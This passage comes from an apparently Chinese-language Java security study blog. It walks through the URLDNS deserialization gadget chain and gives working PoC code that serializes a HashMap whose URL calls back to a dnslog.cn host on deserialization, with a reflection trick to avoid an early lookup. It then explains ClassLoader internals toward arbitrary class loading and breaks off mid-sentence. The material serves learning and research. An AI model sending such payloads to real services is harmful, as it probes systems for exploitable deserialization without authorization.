class="hljs-number">16</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>URL#hashCode：</strong></p><p>那么跟进到这个 URL 类的 hashCode() 方法看下，导入一个URL类，ctrl+鼠标点过去，搜索 hashCode() 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> hashCode;<br><br>        hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>        <span class="hljs-keyword">return</span> hashCode;<br>    &#125;<br></code></pre></td></tr></table></figure><p>判断如果 hashCode 不为<code>-1</code>，那么直接返回了，代码中 hashCode 是通过<code>private</code>关键字进行修饰的赋值为-1，所以会执行下一步进行<code>handler.hashCode(this)</code> </p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240425094458802.png" alt="image-20240425094458802"></p><p>查看 <code>handler.hashCode(this)</code>  方法的定义，重点关注这里的 getHostAddress 方法，正是这步触发了dns请求：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">(URL u)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">// 生成协议部分</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> u.getProtocol();<br>        <span class="hljs-keyword">if</span> (protocol != <span class="hljs-literal">null</span>)<br>            h += protocol.hashCode();<br><br>        <span class="hljs-comment">// 生成host部分</span><br>        <span class="hljs-type">InetAddress</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> getHostAddress(u);<br>        <span class="hljs-keyword">if</span> (addr != <span class="hljs-literal">null</span>) &#123;<br>            h += addr.hashCode();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> u.getHost();<br>            <span class="hljs-keyword">if</span> (host != <span class="hljs-literal">null</span>)<br>                h += host.toLowerCase().hashCode();<br>        &#125;<br><br>        <span class="hljs-comment">// 生成文件部分</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> u.getFile();<br>        <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">null</span>)<br>            h += file.hashCode();<br><br>        <span class="hljs-comment">// 生成端口部分</span><br>        <span class="hljs-keyword">if</span> (u.getPort() == -<span class="hljs-number">1</span>)<br>            h += getDefaultPort();<br>        <span class="hljs-keyword">else</span><br>            h += u.getPort();<br><br>        <span class="hljs-comment">// 生成ref部分</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> u.getRef();<br>        <span class="hljs-keyword">if</span> (ref != <span class="hljs-literal">null</span>)<br>            h += ref.hashCode();<br><br>        <span class="hljs-keyword">return</span> h;<br>    &#125;<br></code></pre></td></tr></table></figure><p>查看 getHostAddress 方法的定义如下，其中 InetAddress.getByName(host) 会进行dns查询：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">(URL u)</span> &#123;<br>        <span class="hljs-comment">// 检查URL对象的hostAddress字段是否已经存储了主机地址，如果已经存储，则直接返回该地址</span><br>    <span class="hljs-keyword">if</span> (u.hostAddress != <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> u.hostAddress;<br><br>    <span class="hljs-comment">// 如果hostAddress字段为空，则尝试从URL对象中获取主机名。</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> u.getHost();<br>        <span class="hljs-keyword">if</span> (host == <span class="hljs-literal">null</span> || host.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                u.hostAddress = InetAddress.getByName(host);<span class="hljs-comment">// 发送dns请求</span><br>            &#125; <span class="hljs-keyword">catch</span> (UnknownHostException ex) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125; <span class="hljs-keyword">catch</span> (SecurityException se) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> u.hostAddress;<br>    &#125;<br></code></pre></td></tr></table></figure><h6 id="Poc验证："><a href="#Poc验证：" class="headerlink" title="Poc验证："></a>Poc验证：</h6><p>以上是根据 ysoserial 中列出的 Gadget 进行的分析，接下来尝试写一个 poc 验证一下</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240425160322758.png" alt="image-20240425160322758"></p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IOException, IllegalAccessException, NoSuchFieldException &#123;<br>        HashMap&lt;URL, String&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, String&gt;(); <span class="hljs-comment">// new一个HashMap对象，需要传入键值对格式，这里传递一个URL类和字符串</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://2miwqz.dnslog.cn&quot;</span>); <span class="hljs-comment">// new一个URL类，内容是dnslog的</span><br>        hashMap.put(url,<span class="hljs-string">&quot;123&quot;</span>); <span class="hljs-comment">// 将URL和字符串put到hashMap里</span><br>        serialize(hashMap);<span class="hljs-comment">// 对hashMap进行序列化</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="hljs-string">&quot;urldns.bin&quot;</span>))); <span class="hljs-comment">//将序列化后的数据输出到urldns.bin文件中</span><br>        oos.writeObject(obj); <span class="hljs-comment">//调用writeObject方法，对传入的类进行序列化操作</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这里发现问题，在进行序列化的时候就已经收到了dns的请求，这是因为给 hashMap 传值是调用了其 put 方法，put方法中调用了前面的 putVal 方法，之后调用 hashCode 方法，进行了dns请求</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240425160427804.png" alt="image-20240425160427804"></p><p>跟一下 hashMap.put 方法，这里调用了 putVal 方法，putVal 又调用了 hash 方法，就会走到前面跟链的结果，从而请求dns：</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240425160959796.png" alt="image-20240425160959796"></p><p>所以为了避免在序列化时就进行dns请求，这里可以使用反射的方式，先将 hashcode 的值设置为不是-1的值，这样就不会执行 <code>handler.hashCode()</code> 方法了，从而不进行dns请求</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240425162122720.png" alt="image-20240425162122720"></p><p>关于反射的机制可以在这个链接中了解一下：<a href="https://javasec.org/javase/Reflection/Reflection.html">https://javasec.org/javase/Reflection/Reflection.html</a></p><p>通过使用反射可以获取到任何类的成员方法、成员变量、构造方法等信息，还可以修改任意的类成员变量值等，这里直接利用反射修改 hashCode 的值即可</p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IOException, IllegalAccessException, NoSuchFieldException &#123;<br>        HashMap&lt;URL, String&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, String&gt;(); <span class="hljs-comment">// new一个HashMap对象，需要传入键值对格式，这里传递一个URL类和字符串</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://s91yp7.dnslog.cn&quot;</span>); <span class="hljs-comment">// new一个URL类，内容是dnslog的</span><br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">URL</span>&gt; urlClass = url.getClass(); <span class="hljs-comment">// 通过反射得到url类</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashCode</span> <span class="hljs-operator">=</span> urlClass.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>); <span class="hljs-comment">// 获取hashCode值</span><br>        hashCode.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-comment">//由于hashCode是私有成员，所有这里需要设置允许访问对象的私有成员</span><br>        hashCode.set(url,<span class="hljs-number">123</span>); <span class="hljs-comment">//修改hashCode值为123</span><br>        hashMap.put(url,<span class="hljs-string">&quot;123&quot;</span>); <span class="hljs-comment">// 将URL和字符串put到hashMap里</span><br>        hashCode.set(url,-<span class="hljs-number">1</span>); <span class="hljs-comment">// 由于之前将hashCode值修改了，为了后续反序列化时执行dns请求，需要将其修改回-1</span><br>        serialize(hashMap);<span class="hljs-comment">// 对hashMap进行序列化</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="hljs-string">&quot;urldns.bin&quot;</span>))); <span class="hljs-comment">//将序列化后的数据输出到urldns.bin文件中</span><br>        oos.writeObject(obj); <span class="hljs-comment">//调用writeObject方法，对传入的类进行序列化操作</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样进行序列化就不会发送dns请求了</p><p>之后对序列化后的文件 urldns.bin 进行反序列化</p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Unserialization</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        unserialize(<span class="hljs-string">&quot;urldns.bin&quot;</span>); <span class="hljs-comment">// 对urldns.bin进行反序列化操作</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, IOException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(Filename))); <span class="hljs-comment">//将urldns.bin文件输入到ois对象中</span><br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>同时 dnslog 接收到了反序列化时的dns请求</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240426092825997.png" alt="image-20240426092825997"></p><h3 id="ClassLoader（类加载机制）"><a href="#ClassLoader（类加载机制）" class="headerlink" title="ClassLoader（类加载机制）"></a>ClassLoader（类加载机制）</h3><h4 id="类加载过程"><a href="#类加载过程" class="headerlink" title="类加载过程"></a>类加载过程</h4><p>先在方法区找class信息，有的话直接调用，没有的话则使用类加载器加载到方法区（静态成员放在静态区，非静态成功放在非静态区)，静态代码块在类加载时自动执行代码，非静态的不执行；先父类后子类，先静态后非静态；静态方法和非静态方法都是被动调用，即不调用就不执行。</p><p>类加载的流程如下图：</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240510145620304.png" alt="image-20240510145620304"></p><p>其中初始化阶段是会执行代码的，使用阶段就是创建对象，也会执行代码</p><h4 id="构造函数和静态代码块"><a href="#构造函数和静态代码块" class="headerlink" title="构造函数和静态代码块"></a>构造函数和静态代码块</h4><p>在Person类中创建一个<strong>静态代码块</strong>(不管调用哪种静态代码，都会调用静态代码块)和<strong>构造代码块</strong>(不管调用哪种构造方法，都会调用构造代码块)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123; <span class="hljs-comment">//静态代码块定义</span><br>        System.out.println(<span class="hljs-string">&quot;静态代码块&quot;</span>);<br>    &#125;<br>    &#123; <span class="hljs-comment">//构造代码块定义</span><br>        System.out.println(<span class="hljs-string">&quot;构造代码块&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当创建对象时，发现两个代码块都被输出了，由此可见在使用阶段两种代码块都调用了</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240510150501986.png" alt="image-20240510150501986"></p><p>接下来分析一下哪个是在初始化阶段调用的，哪个是在使用阶段调用的</p><p>在Person类中加上一个静态变量id，给变量赋值时发现只调用了静态代码块，说明静态代码块是在初始化阶段就执行了</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240510151019135.png" alt="image-20240510151019135"></p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240510151032698.png" alt="image-20240510151032698"></p><p>通过 <em>Class</em>.<em>forName</em> 动态加载Person类，发现调用了静态代码块，说明 <em>Class</em>.<em>forName</em> 加载时对类进行了初始化</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240510151448849.png" alt="image-20240510151448849"></p><p>也可以让类加载的时候不进行初始化，跟踪一下 <em>Class</em>.<em>forName</em> 方法：</p><p>代码里return了一个 <em>forName0</em> 方法</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240510152118522.png" alt="image-20240510152118522"></p><p>跟着看一下这个方法，发现这个方法是native定义的，是c&#x2F;c++写的，其中有四个参数，第一个是类名，第二个是判断是否进行初始化，第三个是 <em>ClassLoader</em> 是个类加载器，第四个参数不重要</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240510152159996.png" alt="image-20240510152159996"></p><p>在 <em>Class</em>.<em>forName</em> 中可以看到判断初始化的参数默认传的是true</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240510152905852.png" alt="image-20240510152905852"></p><p>可以手动让其加载类时不进行初始化，其中第三个参数由于需要传递一个类加载器，可以通过 <em>ClassLoader</em>.<em>getSystemClassLoader</em>() 方法获取一个系统类加载器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br><span class="hljs-comment">//        new Person();</span><br><span class="hljs-comment">//        Person.id = 1;</span><br><span class="hljs-comment">//        Class.forName(&quot;org.example.Person&quot;);</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<br>        Class.forName(<span class="hljs-string">&quot;org.example.Person&quot;</span>,<span class="hljs-literal">false</span>,classLoader);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行后发现没有输出静态代码块，说明没有进行初始化</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240510153459637.png" alt="image-20240510153459637"></p><h4 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h4><p>前面代码是通过 <em>ClassLoader</em>.<em>getSystemClassLoader</em>() 方法来获取的系统类加载器，这里输出查看一下，得到结果是 AppClassLoader </p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240510153907055.png" alt="image-20240510153907055"></p><p>Java中提供了这四种类型的加载器：</p><ul><li>Bootstrap ClassLoader 引导类加载器，是最基本的类加载器，也就是系统类加载器，加载的是 java.lang 下的类，它是ExtClassLoader的父类加载器</li><li>Extention ClassLoader 扩展类加载器，用来加载ext目录下的类库的，ExtClassLoader是AppClassLoader的父类加载器</li><li>Application ClassLoader 系统类加载器，主要负责加载当前应用的 classpath 下的所有类，平常使用的大部分都是通过这个类加载器加载的<ul><li>classpath 实际上就是系统变量java.class.path的值</li><li><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240510155045829.png" alt="image-20240510155045829"></li></ul></li><li>User ClassLoader  自定义类加载器，用户自定义的类加载器，可加载指定路径的class文件</li></ul><p>双亲委派机制，指的就是：<strong>当一个类加载器收到了类加载的请求的时候，他不会直接去加载指定的类，而是把这个请求委托给自己的父加载器去加载。只有父加载器无法加载这个类的时候，才会由当前这个加载器来负责类的加载。</strong></p><p>注意：<strong>双亲委派机制只是一种逻辑的指向，并不是真正的继承关系</strong></p><p><img src="E:/zhaozhichao/Java_Security/images/image_20240520101101.png" alt="image_20240520101101"></p><h4 id="任意类加载"><a href="#任意类加载" class="headerlink" title="任意类加载"></a>任意类加载</h4><p>这里跟踪一下类加载器的底层原理，实现加载任意的类，从而实现任意类加载漏洞利用</p><p>跟踪前需要对jdk的 rt.jar 进行反编译一下，这样可以更清晰的看到代码逻辑，反编译流程可以看一下这个连接<code>https://blog.csdn.net/yangyangrenren/article/details/117554745</code></p><p>加载Person类为例</p><p>在类加载地方打上断点，单机调试按钮</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240515165236643.png" alt="image-20240515165236643"></p><p>单机强制步入(shift+alt+f7)，走到了 ClassLoader 抽象类下的 loadClass 方法（抽象类无法实例化，需要被继承才能被使用）</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240515165251693.png" alt="image-20240515165251693"></p><p>由之前分析得知，我们使用的是 AppClassLoader，所以调用的是 AppClassLoader 的 loadClass方法，这里调用了 super.<em>loadClass</em></p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240515165453793.png" alt="image-20240515165453793"></p><p>继续跟进，代码又回到了 ClassLoader 类里面，在这里查询了parent加载器是否为null，结果为null的话就再往下慢慢去找.(parent加载器:请求委托给自己的父加载器去加载。只有父加载器无法加载这个类的时候，才会由当前这个加载器来负责类的加载。父类加载不了所以为null)</p><p><img src="E:/zhaozhichao/Java_Security/images/image-20240515165540153.png" alt="image-20240515165540153"></p><p>走到 findClass 方法，会进入到URLclassloader里，这是因为Appclassloader中没有findClass方法，URLclassloader是Appclassloader类的父类，所以走到了URLclassloader</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240515165645932.png" alt="image-20240515165645932"></p><p>跟一下URLclassloader的findClass方法，方法中最后会调用一个 <em><strong>defineClass</strong></em> 方法，实际上就是在这个方法里完成了类的加载</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240517091613046.png" alt="image-20240517091613046"></p><p>跟一下这个 <em>defineClass</em>，代码中调用了另一个<em>defineClass</em>方法，继续跟进</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240517091727669.png" alt="image-20240517091727669"></p><p>到了URLclassLoadr的父类SecureClassLoader的defineClass方法</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240517091753317.png" alt="image-20240517091753317"></p><p>继续跟进，发现回到了最开始的 ClassLoader 类的defineClass方法，代码中调用了一个<em>defineClass1</em>方法，跟着看一下这个方法</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240517092158425.png" alt="image-20240517092158425"></p><p>发现是三个native方法，传一个类名，传个字节码，最终就是在这里加载了<strong>字节码</strong></p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240517092223111.png" alt="image-20240517092223111"></p><p>最后再一层一层的返回回去</p><p>从结果分析这几个类的父子关系是ClassLoader-&gt;SecureClassloader-&gt;urlclassloaer-&gt;applicationclassloaer</p><p>方法调用关系是loadClass-&gt;findClass-&gt;defineClass(从字节码加载类)</p><h6 id="通过URLclassloader加载任意类"><a href="#通过URLclassloader加载任意类" class="headerlink" title="通过URLclassloader加载任意类"></a>通过URLclassloader加载任意类</h6><p><strong>上面分析了 